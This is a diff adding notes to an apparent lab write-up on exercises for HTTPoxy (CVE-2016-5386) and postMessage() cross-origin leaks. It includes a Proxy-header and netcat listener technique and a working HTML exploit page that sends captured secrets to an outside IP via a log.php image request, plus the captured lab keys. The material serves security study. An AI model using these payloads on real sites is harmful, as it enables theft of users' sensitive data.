@@ -161,4 +161,46 @@ func main() {
 
 Put all three files in a GitHub repository and `go get github.com/abhaynayar/cve-2018-6574`
 
+### CVE-2016-5386: HTTPoxy
+
+- https://httpoxy.org/
+- The web server adds the prefix HTTP_ and capitalise the string.
+- For example, the Host: header becomes the variable HTTP_HOST.
+- An environment variable of such format exists: HTTP_PROXY.
+
+Solution
+
+- Request being made to `http://ptl-9c6cf080-93a0aa2b.libcurl.so/cgi-bin/hello.cgi`
+- Add header `Proxy: 18.191.42.249:1337`
+- On your vps `$ nc -lvp 1337`
+- We get the key as `User-Agent: 4b25aabc-4dce-43d4-9f86-49327d4548c0`
+
+### postMessage()
+
+- "The window.postMessage() method safely enables cross-origin communication between Window objects; e.g., between a page and a pop-up that it spawned, or between a page and an iframe embedded within it."
+- However, if the application relies on cookies and the opened page sends back sensitive information to the opening page without enforcing a targetOrigin, it's possible for a malicious page to get access to this sensitive information by getting users to visit a malicious page.
+- To prevent this issue, the backend should avoid using * as the second argument of postMessage (targetOrigin).
+
+pm1.html
+```
+<!DOCTYPE html>
+<html>
+    <body>
+        <button onclick='window.open("http://ptl-12065b08-fa3f5dba.libcurl.so/key/0","ptlabdata0","height=200,width=150")'>Decrypt</button>
+        <img id="asdf"></img>
+        <script>
+            window.addEventListener("message", function(event){
+                document.getElementById("asdf").src = "http://18.191.42.249/log.php?c=" + event.data.value;
+            }, false);
+        </script>
+    </body>
+</html>
+```
+
+Success
+```
+http://18.191.42.249/pm1.html
+15492096-e7fc-4675-b36d-d9d4f99a304e
+```
+
 
